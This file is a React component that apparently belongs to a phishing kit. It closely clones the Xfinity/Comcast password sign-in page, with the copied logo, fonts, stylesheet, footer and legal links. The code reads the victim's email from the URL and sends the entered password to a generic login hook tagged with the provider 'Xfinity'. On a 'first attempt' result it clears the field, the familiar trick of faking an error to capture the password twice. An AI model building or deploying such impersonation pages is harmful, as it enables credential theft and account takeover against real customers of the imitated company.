import React, { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface XfinityPasswordPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [searchParams] = useSearchParams();
  const email = searchParams.get('email') || '';
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [pageReady, setPageReady] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (!email) {
      window.location.href = '/';
    }
  }, [email]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const result = await handleFormSubmit(e, { email, password, provider: 'Xfinity' });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  if (!pageReady) {
    return (
      <div style={{ minHeight: '100vh', background: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <Spinner size="lg" color="border-purple-600" />
      </div>
    );
  }

  return (
    <div style={{ minHeight: '100vh', background: '#fff', fontFamily: "'XfinityBrown', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif", display: 'flex', flexDirection: 'column' }}>
      <link rel="stylesheet" href="/xfinity_files/bundle-cd6dc29.css" />
      <link rel="preconnect" href="https://static.cimcontent.net" />
      <style>{`
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-bold.woff2') format('woff2');
          font-weight: 700;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-light.woff2') format('woff2');
          font-weight: 300;
          font-style: normal;
          font-display: swap;
        }
      `}</style>

      <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', flex: 1, padding: '3rem 1.5rem 2rem', maxWidth: '480px', margin: '0 auto', width: '100%', boxSizing: 'border-box' }}>
        {/* Xfinity Logo */}
        <div style={{ marginBottom: '2rem' }}>
          <svg width="91" height="20" viewBox="0 0 107 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M16.845 0L12.558 5.55 8.27 0H0l8.998 11.55L0 23.1h8.27l4.288-5.55 4.287 5.55h8.27l-8.998-11.55L25.115 0h-8.27zM27.07 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S28.07 0 30.01 0zM40.34 3.8v2.6c1.48-1.95 3.63-3.1 6.21-3.1 4.31 0 7.24 2.83 7.24 7.55V23.1h-5.88V12.08c0-2.58-1.44-4.03-3.65-4.03-2.37 0-3.92 1.53-3.92 4.36V23.1h-5.88V3.8h5.88zM56.31 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S57.31 0 59.25 0zM73.97 8.1h-4.45V14c0 3.15 1.2 4.05 3.28 4.05.48 0 .93-.05 1.17-.12v5.12c-.56.15-1.42.25-2.37.25-5.22 0-7.96-2.5-7.96-8.2V8.1h-3.2V3.8h.88c2.12 0 3.12-1.05 3.12-3.15V.38l4.6-.38v3.8h4.93v4.3zM84.86 24c-2.38 0-4.33-.55-6.18-1.55l1.93-4.2c1.28.7 2.65 1.2 3.98 1.2 1.88 0 2.95-.88 3.78-2.68l.2-.43-8.27-12.54h6.28l4.82 8.85L95.6 3.8h6.02L92.13 22.1C90.58 23.45 88.24 24 84.86 24zM106.23 0a.77.77 0 1 1 0 1.54.77.77 0 0 1 0-1.54z" fill="#6B6B76"/>
          </svg>
        </div>

        {/* Email display */}
        <p style={{ fontSize: '1rem', color: '#141417', fontWeight: 700, marginBottom: '0.25rem' }}>{email}</p>

        {/* Heading */}
        <h1 style={{ fontSize: '1.75rem', fontWeight: 700, color: '#141417', marginBottom: '1.25rem', lineHeight: 1.2 }}>
          Enter your password
        </h1>

        {/* Error message */}
        {errorMessage && !isLoading && (
          <div style={{
            padding: '0.75rem 1rem',
            marginBottom: '1rem',
            borderRadius: '0.25rem',
            backgroundColor: '#FEE2E2',
            border: '1px solid #FCA5A5',
            color: '#DC2626',
            fontSize: '0.875rem',
            display: 'flex',
            alignItems: 'center',
            gap: '0.5rem',
            width: '100%',
            boxSizing: 'border-box',
          }}>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style={{ flexShrink: 0 }}>
              <path d="M8 1C4.1 1 1 4.1 1 8s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7zm-.5 3h1v5h-1V4zm.5 8.2c-.4 0-.8-.3-.8-.8s.3-.8.8-.8.8.3.8.8-.4.8-.8.8z"/>
            </svg>
            <span>{errorMessage}</span>
          </div>
        )}

        {/* Password form */}
        <form onSubmit={handleSubmit} style={{ width: '100%' }}>
          {/* Password input with eye toggle */}
          <div style={{ position: 'relative', marginBottom: '0.5rem' }}>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoFocus
              autoComplete="current-password"
              style={{
                width: '100%',
                padding: '0.75rem 2.5rem 0.75rem 0.75rem',
                fontSize: '1rem',
                border: '1px solid #CECED8',
                borderBottom: '2px solid #6138E0',
                borderRadius: '0.25rem 0.25rem 0 0',
                outline: 'none',
                boxSizing: 'border-box',
                fontFamily: 'inherit',
                color: '#141417',
                background: '#fff',
              }}
            />
            {/* Eye toggle button */}
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              style={{
                position: 'absolute',
                right: '0.5rem',
                top: '50%',
                transform: 'translateY(-50%)',
                background: 'none',
                border: 'none',
                cursor: 'pointer',
                padding: '0.25rem',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#6B6B76',
              }}
              aria-label={showPassword ? 'Hide password' : 'Show password'}
            >
              {showPassword ? (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
                  <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
                  <line x1="1" y1="1" x2="23" y2="23"/>
                  <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
                </svg>
              ) : (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                  <circle cx="12" cy="12" r="3"/>
                </svg>
              )}
            </button>
          </div>

          {/* Forgot password link */}
          <div style={{ marginBottom: '1.25rem' }}>
            <a
              href="https://login.xfinity.com/forgot-password"
              target="_blank"
              rel="noopener noreferrer"
              style={{ fontSize: '0.875rem', color: '#5A23B9', textDecoration: 'none', fontWeight: 400 }}
            >
              Forgot password?
            </a>
          </div>

          {/* Keep me signed in checkbox */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1.25rem' }}>
            <input
              type="checkbox"
              id="keepSignedIn"
              defaultChecked
              style={{ width: '18px', height: '18px', accentColor: '#5A23B9', cursor: 'pointer' }}
            />
            <label htmlFor="keepSignedIn" style={{ fontSize: '0.9375rem', color: '#141417', cursor: 'pointer' }}>
              Keep me signed in
            </label>
          </div>

          {/* Terms text */}
          <p style={{ fontSize: '0.8125rem', color: '#6B6B76', marginBottom: '1.5rem', lineHeight: 1.5 }}>
            By signing in, you agree to our{' '}
            <a href="http://my.xfinity.com/terms/web/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Terms of Service</a>
            {' '}and{' '}
            <a href="https://www.xfinity.com/privacy/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Privacy Policy</a>.
          </p>

          {/* Sign in button - not full width */}
          <div style={{ marginBottom: '1.5rem' }}>
            <button
              type="submit"
              disabled={isLoading || !password}
              style={{
                padding: '0.75rem 2.5rem',
                fontSize: '1rem',
                fontWeight: 700,
                color: '#fff',
                backgroundColor: isLoading || !password ? '#B8A1D8' : '#5A23B9',
                border: 'none',
                borderRadius: '2rem',
                cursor: isLoading || !password ? 'not-allowed' : 'pointer',
                fontFamily: 'inherit',
                transition: 'background-color 0.2s',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '0.5rem',
              }}
              onMouseEnter={(e) => { if (!isLoading && password) (e.target as HTMLButtonElement).style.backgroundColor = '#36156F'; }}
              onMouseLeave={(e) => { if (!isLoading && password) (e.target as HTMLButtonElement).style.backgroundColor = '#5A23B9'; }}
            >
              {isLoading && <Spinner size="sm" color="border-white" />}
              {isLoading ? 'Signing in...' : 'Sign in'}
            </button>
          </div>
        </form>

        {/* Sign in as someone else */}
        <p style={{ marginBottom: '1.5rem' }}>
          <a
            href="/"
            style={{ fontSize: '0.9375rem', color: '#141417', textDecoration: 'none', fontWeight: 700 }}
          >
            Sign in as someone else
          </a>
        </p>

        {/* Trouble signing in */}
        <p style={{ fontSize: '0.9375rem', color: '#6B6B76' }}>
          Trouble signing in?{' '}
          <a
            href="https://www.xfinity.com/support/account-login"
            target="_blank"
            rel="noopener noreferrer"
            style={{ color: '#5A23B9', textDecoration: 'none' }}
          >
            Get help
          </a>
        </p>
      </main>

      {/* Footer */}
      <footer style={{
        borderTop: '1px solid #E5E5EA',
        padding: '1rem 1.5rem',
        display: 'flex',
        flexWrap: 'wrap',
        alignItems: 'center',
        justifyContent: 'center',
        gap: '0.25rem 1rem',
        fontSize: '0.75rem',
        color: '#6B6B76',
        fontFamily: 'inherit',
      }}>
        <span>&copy;&nbsp;2026&nbsp;Comcast</span>
        <FooterLink icon={footerDocIcon} href="https://www.xfinity.com/terms" text="Web Terms Of Service" />
        <FooterLink icon={footerDocIcon} href="https://www.xfinity.com/privacy/policy/staterights#california" text="CA Notice at Collection" />
        <FooterLink icon={footerDocIcon} href="http://www.xfinity.com/privacy/policy" text="Privacy Policy" />
        <FooterLink icon={footerPrivacyIcon} href="https://www.xfinity.com/privacy/manage-preference" text="Your Privacy Choices" />
        <FooterLink icon={footerDocIcon} href="https://www.xfinity.com/privacy/policy/staterights#washington" text="Health Privacy Notice" />
        <FooterLink icon={footerPlayIcon} href="https://www.xfinity.com/adinformation" text="Ad Choices" />
      </footer>
    </div>
  );
};

/* Footer icon SVGs */
const footerDocIcon = (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
    <rect x="3" y="1" width="18" height="22" rx="2" stroke="currentColor" strokeWidth="1.5" fill="none"/>
    <line x1="7" y1="7" x2="17" y2="7" stroke="currentColor" strokeWidth="1.5"/>
    <line x1="7" y1="11" x2="17" y2="11" stroke="currentColor" strokeWidth="1.5"/>
    <line x1="7" y1="15" x2="13" y2="15" stroke="currentColor" strokeWidth="1.5"/>
  </svg>
);

const footerPrivacyIcon = (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
    <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="1.5" fill="none"/>
    <circle cx="8" cy="11" r="2" fill="#4CAF50"/>
    <circle cx="16" cy="11" r="2" fill="#2196F3"/>
  </svg>
);

const footerPlayIcon = (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ flexShrink: 0 }}>
    <polygon points="8,4 20,12 8,20" stroke="currentColor" strokeWidth="1.5" fill="none"/>
  </svg>
);

const FooterLink: React.FC<{ icon: React.ReactNode; href: string; text: string }> = ({ icon, href, text }) => (
  <a
    href={href}
    target="_blank"
    rel="noopener noreferrer"
    style={{
      display: 'inline-flex',
      alignItems: 'center',
      gap: '0.25rem',
      color: '#6B6B76',
      textDecoration: 'none',
      fontSize: '0.75rem',
      whiteSpace: 'nowrap',
    }}
  >
    {icon}
    {text}
  </a>
);

export default XfinityPasswordPage;
